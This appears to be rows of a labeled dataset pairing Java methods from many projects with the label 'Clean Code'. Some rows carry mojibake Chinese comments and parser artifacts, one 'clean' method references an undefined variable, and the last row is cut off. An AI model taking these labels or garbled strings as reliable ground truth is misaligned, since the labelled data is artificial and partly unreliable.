"private void updateFiltersView(boolean showMediaFilters,ArrayList<Object> users,ArrayList<FiltersView.DateData> dates,boolean archive,boolean animated){
  if (!searchIsShowed || onlySelect && initialDialogsType != DIALOGS_TYPE_FORWARD) {
    return;
  }
  boolean hasMediaFilter=false;
  boolean hasUserFilter=false;
  boolean hasDateFilter=false;
  boolean hasArchiveFilter=false;
  ArrayList<FiltersView.MediaFilterData> currentSearchFilters=searchViewPager.getCurrentSearchFilters();
  for (int i=0; i < currentSearchFilters.size(); i++) {
    if (currentSearchFilters.get(i).isMedia()) {
      hasMediaFilter=true;
    }
 else     if (currentSearchFilters.get(i).filterType == FiltersView.FILTER_TYPE_CHAT) {
      hasUserFilter=true;
    }
 else     if (currentSearchFilters.get(i).filterType == FiltersView.FILTER_TYPE_DATE) {
      hasDateFilter=true;
    }
 else     if (currentSearchFilters.get(i).filterType == FiltersView.FILTER_TYPE_ARCHIVE) {
      hasArchiveFilter=true;
    }
  }
  if (hasArchiveFilter) {
    archive=false;
  }
  boolean visible=false;
  boolean hasUsersOrDates=(users != null && !users.isEmpty()) || (dates != null && !dates.isEmpty() || archive);
  if (!hasMediaFilter && !hasUsersOrDates && showMediaFilters) {
  }
 else   if (hasUsersOrDates) {
    ArrayList<Object> finalUsers=(users != null && !users.isEmpty() && !hasUserFilter) ? users : null;
    ArrayList<FiltersView.DateData> finalDates=(dates != null && !dates.isEmpty() && !hasDateFilter) ? dates : null;
    if (finalUsers != null || finalDates != null || archive) {
      visible=true;
      filtersView.setUsersAndDates(finalUsers,finalDates,archive);
    }
  }
  if (!visible) {
    filtersView.setUsersAndDates(null,null,false);
  }
  if (!animated) {
    filtersView.getAdapter().notifyDataSetChanged();
  }
  if (searchTabsView != null) {
    searchTabsView.hide(visible,true);
  }
  filtersView.setEnabled(visible);
  filtersView.setVisibility(View.VISIBLE);
}",0,Clean Code
"public String getJavaName(){
  return javaName;
}
",0,Clean Code
"@Test public void testSearch() throws Exception {
  if (StorageLayer.getStorage(process.getProcess()).getType() != STORAGE_TYPE.SQL) {
    return;
  }
  createUsers();
  for (  TenantIdentifier tenant : new TenantIdentifier[]{t1,t2,t3}) {
{
      String[] users=getUsers(tenant,new String[]{""user""},null,null);
      assertEquals(8,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,new String[]{""gmail.com""},null,null);
      assertEquals(4,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,null,new String[]{""+1234""},null);
      assertEquals(1,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,null,null,new String[]{""goog""});
      assertEquals(2,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,null,null,new String[]{""face""});
      assertEquals(2,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,null,null,new String[]{""goog"",""face""});
      assertEquals(4,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,new String[]{""gmail.com""},null,new String[]{""goog""});
      assertEquals(1,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
{
      String[] users=getUsers(tenant,new String[]{""gmail.com""},null,new String[]{""goog"",""face""});
      assertEquals(2,users.length);
      for (      String user : users) {
        assertTrue(tenantToUsers.get(tenant).contains(user));
      }
    }
  }
}",0,Clean Code
"List<CBend> getBends();
",0,Clean Code
"void onGetProfileDetailTLVBegin(Bundle bundle,long j2,Card card);",0,Clean Code
"/** 
 * <code>optional .RogueVirtualItemData add_item_list = 11;</code>
 * @return this
 */
public RogueActionResultData clearAddItemList(){
  bitField0_&=~0x00000001;
  addItemList.clear();
  return this;
}",0,Clean Code
"public DurationUnit getUnit(){
  return unit;
}
",0,Clean Code
"@Override public void updateTask(String workflowId,String taskId,String[] keys,Object[] values){
}
",0,Clean Code
"@Override public void onCastHit(GameAvatar caster,List<? extends GameEntity> entities){
  for (  GameEntity entity : entities) {
    if (entity instanceof EntityProp) {
      caster.getScene().destroyProp(prop);
    }
  }
}
",0,Clean Code
"public boolean equalsQuickSearch(QuickSearch q){
  if (null == q) {
    return false;
  }
  if (q.mode != mMode) {
    return false;
  }
  if (q.category != mCategory) {
    return false;
  }
  if (!StringUtils.equals(q.keyword,mKeyword)) {
    return false;
  }
  if (q.advanceSearch != mAdvanceSearch) {
    return false;
  }
  if (q.minRating != mMinRating) {
    return false;
  }
  if (q.pageFrom != mPageFrom) {
    return false;
  }
  if (q.pageTo != mPageTo) {
    return false;
  }
  return true;
}
",0,Clean Code
"public String getKey(){
  return this.key;
}
",0,Clean Code
"public String key(){
  return this.dataSourceId + ""_"" + this.databaseName;
}
",0,Clean Code
"@Test public void testGeoradius(){
  jedisSentinel.georadius(""key"",1337,1338,32,GeoUnit.KM);
  jedisSentinel.georadius(""key"",1337,1338,32,GeoUnit.KM,GeoRadiusParam.geoRadiusParam());
}",0,Clean Code
"@Override public EnhanceRogueBuffCsReq mergeFrom(final EnhanceRogueBuffCsReq other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasBuffId()) {
    setBuffId(other.buffId);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@71617386!org.eclipse.jdt.core.dom.MethodDeclaration@5c6041",0,Clean Code
"@Override public void handle(Object model,Authentication authenticate,HttpServletRequest request,HttpServletResponse response){
  UserDetails userDetails=(UserDetails)authenticate.getPrincipal();
  UserModel user=UserUtil.getUserByUserName(userDetails.getUsername());
  if (!StringUtils.equals(UserUtil.SUPER_ADMIN,user.getUsername())) {
    if (!TenantUtil.SUPER_ADMIN_TENANT_ID.equals(user.getTenantId())) {
      TenantModel tenant=TenantUtil.getTenant(user.getTenantId());
      if (tenant == null) {
        throw new TokenException(TokenMsg.EXCEPTION_LOGIN_TENANT_NOT_USABLE);
      }
    }
    if (StringUtils.isEmpty(user.getEnable()) || DictType.NO_YES_NO.getValue().equals(user.getEnable())) {
      throw new TokenException(TokenMsg.EXCEPTION_LOGIN_ACCOUNT_LOCKED);
    }
    List<String> roleModelList=UserUtil.getUserRolesByUserId(user.getId());
    if (CollUtil.isEmpty(roleModelList)) {
      throw new TokenException(TokenMsg.EXCEPTION_USER_ROLE_NOT_NULL);
    }
    List<MenuModel> menuModelList=UserUtil.getMenuListByUserId(user.getId());
    if (CollUtil.isEmpty(menuModelList)) {
      throw new TokenException(TokenMsg.EXCEPTION_USER_MENU_NOT_NULL);
    }
    List<String> userAllPermsList=UserUtil.getUserAllPermsByUserId(user.getId());
    if (CollUtil.isEmpty(userAllPermsList)) {
      throw new TokenException(TokenMsg.EXCEPTION_USER_PERMS_NOT_NULL);
    }
  }
}
",0,Clean Code
"public String getHost(){
  return configuration.getHost();
}
",0,Clean Code
"public Response intercept(Interceptor.Chain chain) throws IOException {
  Request request=chain.request();
  log(request);
  return chain.proceed(request);
}
",0,Clean Code
"@Override public void handleLoadPackage(){
  initHook(CustomRefreshRate.INSTANCE,mPrefsMap.getBoolean(""various_custom_refresh_rate""));
  initHook(new DisableGetDisplayCtrlCode(),mPrefsMap.getBoolean(""powerkeeper_disable_get_display_ctrl_code""));
  initHook(LockMaxFps.INSTANCE,mPrefsMap.getBoolean(""powerkeeper_lock_max_fps""));
  initHook(DontKillApps.INSTANCE,mPrefsMap.getBoolean(""powerkeeper_do_not_kill_apps""));
  initHook(new PreventBatteryWitelist(),mPrefsMap.getBoolean(""powerkeeper_prevent_recovery_of_battery_optimization_whitelist""));
}
",0,Clean Code
"private void sendUriAsDocument(Uri uri){
  if (uri == null) {
    return;
  }
  String extractUriFrom=uri.toString();
  if (extractUriFrom.contains(""com.google.android.apps.photos.contentprovider"")) {
    try {
      String firstExtraction=extractUriFrom.split(""/1/"")[1];
      int index=firstExtraction.indexOf(""/ACTUAL"");
      if (index != -1) {
        firstExtraction=firstExtraction.substring(0,index);
        String secondExtraction=URLDecoder.decode(firstExtraction,""UTF-8"");
        uri=Uri.parse(secondExtraction);
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
  }
  String tempPath=AndroidUtilities.getPath(uri);
  String originalPath=tempPath;
  boolean sendAsUri=false;
  if (!BuildVars.NO_SCOPED_STORAGE) {
    sendAsUri=true;
  }
 else   if (tempPath == null) {
    originalPath=uri.toString();
    tempPath=MediaController.copyFileToCache(uri,""file"");
    if (tempPath == null) {
      showAttachmentError();
      return;
    }
  }
  fillEditingMediaWithCaption(null,null);
  if (sendAsUri) {
    SendMessagesHelper.prepareSendingDocument(getAccountInstance(),null,null,uri,null,null,dialog_id,replyingMessageObject,getThreadMessage(),null,editingMessageObject,true,0);
  }
 else {
    SendMessagesHelper.prepareSendingDocument(getAccountInstance(),tempPath,originalPath,null,null,null,dialog_id,replyingMessageObject,getThreadMessage(),null,editingMessageObject,true,0);
  }
  hideFieldPanel(false);
}",0,Clean Code
"/** 
 * Splits the kv text. <p>Both escaping and quoting is supported. When the escape character is not '\0', then the next character to the escape character will be escaped. When the quote character is not '\0', then all characters between consecutive quote characters will be escaped.</p>
 * @param text The text to be split.
 * @param entryDelimiter The delimiter of entries.
 * @param kvDelimiter The delimiter between key and value.
 * @param escapeChar The escaping character. Only valid if not '\0'.
 * @param quoteChar The quoting character.
 * @return The fields split from the text.
 */
public static Map<String,String> splitKv(@Nonnull String text,@Nonnull Character entryDelimiter,@Nonnull Character kvDelimiter,@Nullable Character escapeChar,@Nullable Character quoteChar){
  List<Map<String,String>> lines=splitKv(text,entryDelimiter,kvDelimiter,escapeChar,quoteChar,null);
  if (lines.size() == 0) {
    return new HashMap<>();
  }
  return lines.get(0);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@5ed81eb5",0,Clean Code
"@Override public List<SourceRecord> poll() throws InterruptedException {
  List<SourceRecord> sourceRecords=target.poll();
  List<SourceRecord> outSourceRecords=new LinkedList<>();
  if (isInSnapshotPhase) {
    if (sourceRecords != null && !sourceRecords.isEmpty()) {
      for (      SourceRecord sourceRecord : sourceRecords) {
        SourceRecord current=markRecordTimestamp(sourceRecord);
        if (isSnapshotRecord(current)) {
          markSnapshotRecord(current);
          if (currentLastSnapshotRecord != null) {
            outSourceRecords.add(currentLastSnapshotRecord);
          }
          currentLastSnapshotRecord=current;
        }
 else {
          if (currentLastSnapshotRecord != null) {
            outSourceRecords.add(markLastSnapshotRecordOfAll(currentLastSnapshotRecord));
            currentLastSnapshotRecord=null;
            isInSnapshotPhase=false;
          }
          outSourceRecords.add(current);
        }
      }
    }
 else {
      if (!isCopying()) {
        if (currentLastSnapshotRecord != null) {
          outSourceRecords.add(markLastSnapshotRecordOfAll(currentLastSnapshotRecord));
          currentLastSnapshotRecord=null;
        }
        isInSnapshotPhase=false;
      }
    }
  }
 else {
    if (sourceRecords != null && !sourceRecords.isEmpty()) {
      for (      SourceRecord current : sourceRecords) {
        outSourceRecords.add(markRecordTimestamp(current));
      }
    }
  }
  return outSourceRecords;
}
",0,Clean Code
"public ResetDefaultViewLayoutAction(final ViewTabPanelFunctions controller){
  this.controller=checkNotNull(controller);
}
",0,Clean Code
"public T get(int index){
  return null;
}
public List<T> get(){
  return null;
}
",0,Clean Code
"@Override public CompletableFuture<Void> asyncAddMessage(String queue,Message message){
  return CompletableFuture.runAsync(() -> addMessage(queue,message),executorService);
}
",0,Clean Code
"/** 
 * @param store The chat memory store responsible for storing the chat memory state.If not provided, an  {@link InMemoryChatMemoryStore} will be used.
 * @return builder
 */
public Builder chatMemoryStore(ChatMemoryStore store){
  this.store=store;
  return this;
}
",0,Clean Code
"private GradientDrawable createGradientDrawable(int color,int cornerRadius){
  int mColorAlpha=(color & 0xff000000) >> 24;
  int mColorRed=(color & 0x00ff0000) >> 16;
  int mColorGreen=(color & 0x0000ff00) >> 8;
  int mColorBlue=(color & 0x000000ff);
  GradientDrawable mBackgroundDrawable=new GradientDrawable();
  mBackgroundDrawable.setShape(GradientDrawable.RECTANGLE);
  mBackgroundDrawable.setColor(Color.argb(mColorAlpha,mColorRed,mColorGreen,mColorBlue));
  mBackgroundDrawable.setCornerRadius(cornerRadius);
  return mBackgroundDrawable;
}
private GradientDrawable createGradientDrawable(String color,int cornerRadius){
  GradientDrawable mBackgroundDrawable=new GradientDrawable();
  mBackgroundDrawable.setShape(GradientDrawable.RECTANGLE);
  mBackgroundDrawable.setColor(Color.parseColor(color));
  mBackgroundDrawable.setCornerRadius(cornerRadius);
  return mBackgroundDrawable;
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (this == o) {
    return true;
  }
  if (!(o instanceof TubeClientConfig)) {
    return false;
  }
  TubeClientConfig that=(TubeClientConfig)o;
  if (rpcReadTimeoutMs != that.rpcReadTimeoutMs) {
    return false;
  }
  if (rpcConnProcessorCnt != that.rpcConnProcessorCnt) {
    return false;
  }
  if (rpcNettyWorkMemorySize != that.rpcNettyWorkMemorySize) {
    return false;
  }
  if (rpcRspCallBackThreadCnt != that.rpcRspCallBackThreadCnt) {
    return false;
  }
  if (nettyWriteBufferHighWaterMark != that.nettyWriteBufferHighWaterMark) {
    return false;
  }
  if (nettyWriteBufferLowWaterMark != that.nettyWriteBufferLowWaterMark) {
    return false;
  }
  if (maxRegisterRetryTimes != that.maxRegisterRetryTimes) {
    return false;
  }
  if (regFailWaitPeriodMs != that.regFailWaitPeriodMs) {
    return false;
  }
  if (maxHeartBeatRetryTimes != that.maxHeartBeatRetryTimes) {
    return false;
  }
  if (heartbeatPeriodMs != that.heartbeatPeriodMs) {
    return false;
  }
  if (heartbeatPeriodAfterFail != that.heartbeatPeriodAfterFail) {
    return false;
  }
  if (linkStatsDurationMs != that.linkStatsDurationMs) {
    return false;
  }
  if (linkStatsForbiddenDurationMs != that.linkStatsForbiddenDurationMs) {
    return false;
  }
  if (unAvailableFbdDurationMs != that.unAvailableFbdDurationMs) {
    return false;
  }
  if (linkStatsMaxAllowedFailTimes != that.linkStatsMaxAllowedFailTimes) {
    return false;
  }
  if (Double.compare(that.linkStatsMaxForbiddenRate,linkStatsMaxForbiddenRate) != 0) {
    return false;
  }
  if (Double.compare(that.maxSentForbiddenRate,maxSentForbiddenRate) != 0) {
    return false;
  }
  if (maxForbiddenCheckDuration != that.maxForbiddenCheckDuration) {
    return false;
  }
  if (sessionStatisticCheckDuration != that.sessionStatisticCheckDuration) {
    return false;
  }
  if (Double.compare(that.sessionWarnForbiddenRate,sessionWarnForbiddenRate) != 0) {
    return false;
  }
  if (sessionWarnDelayedMsgCount != that.sessionWarnDelayedMsgCount) {
    return false;
  }
  if (linkMaxAllowedDelayedMsgCount != that.linkMaxAllowedDelayedMsgCount) {
    return false;
  }
  if (sessionMaxAllowedDelayedMsgCount != that.sessionMaxAllowedDelayedMsgCount) {
    return false;
  }
  if (enableUserAuthentic != that.enableUserAuthentic) {
    return false;
  }
  if (!usrName.equals(that.usrName)) {
    return false;
  }
  if (!usrPassWord.equals(that.usrPassWord)) {
    return false;
  }
  if (!this.tlsConfig.equals(that.tlsConfig)) {
    return false;
  }
  if (!this.statsConfig.equals(that.statsConfig)) {
    return false;
  }
  return masterInfo.equals(that.masterInfo);
}",0,Clean Code
"/** 
 * Tries to convert the raw value into the provided type.
 * @param rawValue rawValue to convert into the provided type clazz
 * @param clazz clazz specifying the target type
 * @param < T > type of the result
 * @return the converted value if rawValue is of type clazz
 * @throws IllegalArgumentException if the rawValue cannot be converted in the specified targettype clazz
 */
@SuppressWarnings(""unchecked"") public static <T>T convertValue(Object rawValue,Class<?> clazz){
  if (Integer.class.equals(clazz)) {
    return (T)convertToInt(rawValue);
  }
 else   if (Long.class.equals(clazz)) {
    return (T)convertToLong(rawValue);
  }
 else   if (Boolean.class.equals(clazz)) {
    return (T)convertToBoolean(rawValue);
  }
 else   if (Float.class.equals(clazz)) {
    return (T)convertToFloat(rawValue);
  }
 else   if (Double.class.equals(clazz)) {
    return (T)convertToDouble(rawValue);
  }
 else   if (String.class.equals(clazz)) {
    return (T)convertToString(rawValue);
  }
 else   if (clazz.isEnum()) {
    return (T)convertToEnum(rawValue,(Class<? extends Enum<?>>)clazz);
  }
 else   if (clazz == Duration.class) {
    return (T)convertToDuration(rawValue);
  }
 else   if (clazz == Map.class) {
    return (T)convertToProperties(rawValue);
  }
  throw new IllegalArgumentException(""Unsupported type: "" + clazz);
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(npcId);
  }
  return size;
}",0,Clean Code
"private Extractor createExtractorByFileExtension(Uri uri,Format format,List<Format> muxedCaptionFormats,DrmInitData drmInitData,TimestampAdjuster timestampAdjuster){
  String lastPathSegment=uri.getLastPathSegment();
  if (lastPathSegment == null) {
    lastPathSegment="""";
  }
  if (MimeTypes.TEXT_VTT.equals(format.sampleMimeType) || lastPathSegment.endsWith(WEBVTT_FILE_EXTENSION) || lastPathSegment.endsWith(VTT_FILE_EXTENSION)) {
    return new WebvttExtractor(format.language,timestampAdjuster);
  }
 else   if (lastPathSegment.endsWith(AAC_FILE_EXTENSION)) {
    return new AdtsExtractor();
  }
 else   if (lastPathSegment.endsWith(AC3_FILE_EXTENSION) || lastPathSegment.endsWith(EC3_FILE_EXTENSION)) {
    return new Ac3Extractor();
  }
 else   if (lastPathSegment.endsWith(AC4_FILE_EXTENSION)) {
    return new Ac4Extractor();
  }
 else   if (lastPathSegment.endsWith(MP3_FILE_EXTENSION)) {
    return new Mp3Extractor(0,0);
  }
 else   if (lastPathSegment.endsWith(MP4_FILE_EXTENSION) || lastPathSegment.startsWith(M4_FILE_EXTENSION_PREFIX,lastPathSegment.length() - 4) || lastPathSegment.startsWith(MP4_FILE_EXTENSION_PREFIX,lastPathSegment.length() - 5)|| lastPathSegment.startsWith(CMF_FILE_EXTENSION_PREFIX,lastPathSegment.length() - 5)) {
    return createFragmentedMp4Extractor(timestampAdjuster,format,drmInitData,muxedCaptionFormats);
  }
 else {
    return createTsExtractor(payloadReaderFactoryFlags,exposeCea608WhenMissingDeclarations,format,muxedCaptionFormats,timestampAdjuster);
  }
}",0,Clean Code
"void resendMsg(@NotNull Contact contact,long j2,@Nullable IOperateCallback iOperateCallback);",0,Clean Code
"/** 
 * {@inheritDoc}<p> The default implementation does nothing. </p>
 */
@Override public void enterConstantArray(FiltersParser.ConstantArrayContext ctx){
}
",0,Clean Code
"@Nullable private String search(byte[] tags,byte[] tag){
  int low=0;
  int high=tags.length;
  while (low < high) {
    int start=(low + high) / 2;
    while (start > -1 && tags[start] != '\n') {
      start--;
    }
    start++;
    int middle=1;
    while (tags[start + middle] != '\r') {
      middle++;
    }
    int end=middle + 1;
    while (tags[start + end] != '\n') {
      end++;
    }
    int compare;
    int tagIndex=0;
    int curIndex=start;
    for (; ; ) {
      int tagByte=tag[tagIndex] & 0xff;
      int curByte=tags[curIndex] & 0xff;
      compare=tagByte - curByte;
      if (compare != 0) {
        break;
      }
      tagIndex++;
      curIndex++;
      if (tagIndex == tag.length && curIndex == start + middle) {
        break;
      }
      if (tagIndex == tag.length) {
        compare=-1;
        break;
      }
      if (curIndex == start + middle) {
        compare=1;
        break;
      }
    }
    if (compare < 0) {
      high=start - 1;
    }
 else     if (compare > 0) {
      low=start + end + 1;
    }
 else {
      byte[] bytes=Base64.decode(tags,start + middle + 1,end - middle - 1,Base64.DEFAULT);
      return new String(bytes,TextUrl.UTF_8);
    }
  }
  return null;
}",0,Clean Code
"private SequenceExampleProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private SequenceExampleProto(){
  className_="""";
}
!org.eclipse.jdt.core.dom.MethodDeclaration@2dda3cb2",0,Clean Code
"/** 
 * <code>optional uint32 exp = 10;</code>
 * @return the exp
 */
public int getExp(){
  return exp;
}",0,Clean Code
"/** 
 * @param kv 瀛楀吀鍊�
 * @return
 */
List<HrmModelFiledVO> queryFieldValue(@Param(""data"") Dict kv);
",0,Clean Code
"public int getAdvanceSearch(){
  int advanceSearch=0;
  if (mSname.isChecked())   advanceSearch|=SNAME;
  if (mStags.isChecked())   advanceSearch|=STAGS;
  if (mSdesc.isChecked())   advanceSearch|=SDESC;
  if (mStorr.isChecked())   advanceSearch|=STORR;
  if (mSto.isChecked())   advanceSearch|=STO;
  if (mSdt1.isChecked())   advanceSearch|=SDT1;
  if (mSdt2.isChecked())   advanceSearch|=SDT2;
  if (mSh.isChecked())   advanceSearch|=SH;
  if (mSfl.isChecked())   advanceSearch|=SFL;
  if (mSfu.isChecked())   advanceSearch|=SFU;
  if (mSft.isChecked())   advanceSearch|=SFT;
  return advanceSearch;
}",0,Clean Code
"public Collection<CombinedDiffNode> getCombinedGraphSelection(){
  final Collection<CombinedDiffNode> selectedNodes=new ArrayList<>();
  for (  final ZyGraphNode<?> node : this.selectedNodes) {
    if (node instanceof CombinedDiffNode) {
      selectedNodes.add((CombinedDiffNode)node);
    }
  }
  return selectedNodes;
}
",0,Clean Code
"@Override protected boolean drawChild(Canvas canvas,View child,long drawingTime){
  int width=getMeasuredWidth();
  int translationX=(int)innerTranslationX;
  final int restoreCount=canvas.save();
  canvas.clipRect(translationX,0,width,getHeight());
  final boolean result=super.drawChild(canvas,child,drawingTime);
  canvas.restoreToCount(restoreCount);
  if (translationX != 0 && child == containerView) {
    float opacity=Math.min(0.8f,(width - translationX) / (float)width);
    if (opacity < 0) {
      opacity=0;
    }
    scrimPaint.setColor((int)(((0x99000000 & 0xff000000) >>> 24) * opacity) << 24);
    canvas.drawRect(0,0,translationX,getHeight(),scrimPaint);
    final float alpha=Math.max(0,Math.min((width - translationX) / (float)AndroidUtilities.dp(20),1.0f));
    layerShadowDrawable.setBounds(translationX - layerShadowDrawable.getIntrinsicWidth(),child.getTop(),translationX,child.getBottom());
    layerShadowDrawable.setAlpha((int)(0xff * alpha));
    layerShadowDrawable.draw(canvas);
  }
  return result;
}
@Override protected boolean drawChild(Canvas canvas,View child,long drawingTime){
  if (windowView.movingPage) {
    int width=getMeasuredWidth();
    int translationX=(int)listView[0].getTranslationX();
    int clipLeft=0;
    int clipRight=width;
    if (child == listView[1]) {
      clipRight=translationX;
    }
 else     if (child == listView[0]) {
      clipLeft=translationX;
    }
    final int restoreCount=canvas.save();
    canvas.clipRect(clipLeft,0,clipRight,getHeight());
    final boolean result=super.drawChild(canvas,child,drawingTime);
    canvas.restoreToCount(restoreCount);
    if (translationX != 0) {
      if (child == listView[0]) {
        final float alpha=Math.max(0,Math.min((width - translationX) / (float)AndroidUtilities.dp(20),1.0f));
        layerShadowDrawable.setBounds(translationX - layerShadowDrawable.getIntrinsicWidth(),child.getTop(),translationX,child.getBottom());
        layerShadowDrawable.setAlpha((int)(0xff * alpha));
        layerShadowDrawable.draw(canvas);
      }
 else       if (child == listView[1]) {
        float opacity=Math.min(0.8f,(width - translationX) / (float)width);
        if (opacity < 0) {
          opacity=0;
        }
        scrimPaint.setColor((int)(((0x99000000 & 0xff000000) >>> 24) * opacity) << 24);
        canvas.drawRect(clipLeft,0,clipRight,getHeight(),scrimPaint);
      }
    }
    return result;
  }
 else {
    return super.drawChild(canvas,child,drawingTime);
  }
}",0,Clean Code
"public Builder toolChoice(ToolChoiceMode toolChoiceMode){
  this.toolChoice=toolChoiceMode;
  return this;
}
public Builder toolChoice(String functionName){
  return toolChoice(ToolChoice.from(functionName));
}
public Builder toolChoice(Object toolChoice){
  this.toolChoice=toolChoice;
  return this;
}
",0,Clean Code
"private static void onClick(View v){
  if (v.getWindowToken() == null)   return;
  Launcher launcher=Launcher.getLauncher(v.getContext());
  if (!launcher.getWorkspace().isFinishedSwitchingState())   return;
  Object tag=v.getTag();
  if (tag instanceof WorkspaceItemInfo) {
    onClickAppShortcut(v,(WorkspaceItemInfo)tag,launcher);
  }
 else   if (tag instanceof FolderInfo) {
    if (v instanceof FolderIcon) {
      onClickFolderIcon(v);
    }
 else     if (v instanceof AppPairIcon) {
      onClickAppPairIcon(v);
    }
  }
 else   if (tag instanceof AppInfo) {
    startAppShortcutOrInfoActivity(v,(AppInfo)tag,launcher);
    MODEL_EXECUTOR.execute(() -> {
      NeoPrefs prefs=NeoPrefs.getInstance(launcher);
      if (prefs.getDrawerSortMode().getValue() == Config.SORT_MOST_USED) {
        prefs.getReloadGrid();
      }
    }
);
  }
 else   if (tag instanceof LauncherAppWidgetInfo) {
    if (v instanceof PendingAppWidgetHostView) {
      onClickPendingWidget((PendingAppWidgetHostView)v,launcher);
    }
  }
 else   if (tag instanceof ItemClickProxy) {
    ((ItemClickProxy)tag).onItemClicked(v);
  }
}
",0,Clean Code
"/** 
 * <code>optional .MotionInfo motion = 4;</code>
 * @return this
 */
public EnterMapRotationRegionScRsp clearMotion(){
  bitField0_&=~0x00000004;
  motion.clear();
  return this;
}",0,Clean Code
"private void calculateAverageFrameSize(ExtractorInput input) throws IOException, InterruptedException {
  if (hasCalculatedAverageFrameSize) {
    return;
  }
  averageFrameSize=C.LENGTH_UNSET;
  input.resetPeekPosition();
  if (input.getPosition() == 0) {
    peekId3Header(input);
  }
  int numValidFrames=0;
  long totalValidFramesSize=0;
  while (input.peekFully(scratch.data,0,2,true)) {
    scratch.setPosition(0);
    int syncBytes=scratch.readUnsignedShort();
    if (!AdtsReader.isAdtsSyncWord(syncBytes)) {
      numValidFrames=0;
      break;
    }
 else {
      if (!input.peekFully(scratch.data,0,4,true)) {
        break;
      }
      scratchBits.setPosition(14);
      int currentFrameSize=scratchBits.readBits(13);
      if (currentFrameSize <= 6) {
        hasCalculatedAverageFrameSize=true;
        throw new ParserException(""Malformed ADTS stream"");
      }
      totalValidFramesSize+=currentFrameSize;
      if (++numValidFrames == NUM_FRAMES_FOR_AVERAGE_FRAME_SIZE) {
        break;
      }
      if (!input.advancePeekPosition(currentFrameSize - 6,true)) {
        break;
      }
    }
  }
  input.resetPeekPosition();
  if (numValidFrames > 0) {
    averageFrameSize=(int)(totalValidFramesSize / numValidFrames);
  }
 else {
    averageFrameSize=C.LENGTH_UNSET;
  }
  hasCalculatedAverageFrameSize=true;
}",0,Clean Code
"/** 
 * <code>optional string client_secret_key = 274;</code>
 * @return whether the clientSecretKey field is set
 */
public boolean hasClientSecretKey(){
  return (bitField0_ & 0x00004000) != 0;
}",0,Clean Code
"/** 
 * 鎵嬪姩鍒嗙墖涓婁紶-鍙栨秷鏃讹紝妫�鏌ユ枃浠朵俊鎭浉鍏冲弬鏁帮紝濡傛灉缂哄皯鍒欐姏鍑哄紓甯�
 * @param fileInfo 鏂囦欢淇℃伅
 */
public static void abortMultipartUpload(FileInfo fileInfo){
  if (fileInfo == null)   throw new FileStorageRuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-鍙栨秷澶辫触锛岃浼犲叆 fileInfo 鍙傛暟"");
  if (fileInfo.getPlatform() == null)   throw new FileStorageRuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-鍙栨秷澶辫触锛岃鍦� FileInfo 涓紶鍏� platform 鍙傛暟"");
  if (fileInfo.getBasePath() == null)   throw new FileStorageRuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-鍙栨秷澶辫触锛岃鍦� FileInfo 涓紶鍏� basePath 鍙傛暟"");
  if (fileInfo.getPath() == null)   throw new FileStorageRuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-鍙栨秷澶辫触锛岃鍦� FileInfo 涓紶鍏� path 鍙傛暟"");
  if (fileInfo.getFilename() == null)   throw new FileStorageRuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-鍙栨秷澶辫触锛岃鍦� FileInfo 涓紶鍏� filename 鍙傛暟"");
  if (fileInfo.getUrl() == null)   throw new FileStorageRuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-鍙栨秷澶辫触锛岃鍦� FileInfo 涓紶鍏� url 鍙傛暟"");
  if (fileInfo.getUploadId() == null)   throw new RuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-鍙栨秷澶辫触锛岃鍦� FileInfo 涓紶鍏� uploadId 鍙傛暟"");
}
",0,Clean Code
"/** 
 * 鏍￠獙spu涓婁笅鏋朵俊鎭�
 * @param spu
 * @return
 */
private String checkUpdateStatusData(SpuVO spu){
  Long shopId=AuthUserContext.get().getTenantId();
  if (Objects.isNull(spu)) {
    return ""鏌ユ壘涓嶅埌璇ュ晢鍝佷俊鎭�"";
  }
  if (!Objects.equals(spu.getShopId(),shopId)) {
    return ""鏌ユ壘涓嶅埌璇ュ晢鍝佷俊鎭�"";
  }
  if (!(Objects.equals(spu.getStatus(),StatusEnum.ENABLE.value()) || Objects.equals(spu.getStatus(),StatusEnum.DISABLE.value()))) {
    return ""鍟嗗搧鐘舵�佸紓甯革紝娓呭埛鏂板悗閲嶈瘯"";
  }
  if (Objects.equals(spu.getStatus(),StatusEnum.ENABLE.value())) {
    CategoryVO category=categoryService.getById(spu.getCategoryId());
    if (Objects.equals(category.getStatus(),StatusEnum.DISABLE.value())) {
      return ""璇ュ晢鍝佹墍灞炵殑骞冲彴鍒嗙被澶勪簬涓嬬嚎涓紝鍟嗗搧涓嶈兘涓婃灦锛岃鑱旂郴绠＄悊鍛樺悗鍐嶈繘琛屾搷浣�"";
    }
    if (Objects.equals(Constant.PLATFORM_SHOP_ID,AuthUserContext.get().getTenantId())) {
      CategoryVO shopCategory=categoryService.getById(spu.getShopCategoryId());
      if (Objects.equals(category.getStatus(),StatusEnum.DISABLE.value())) {
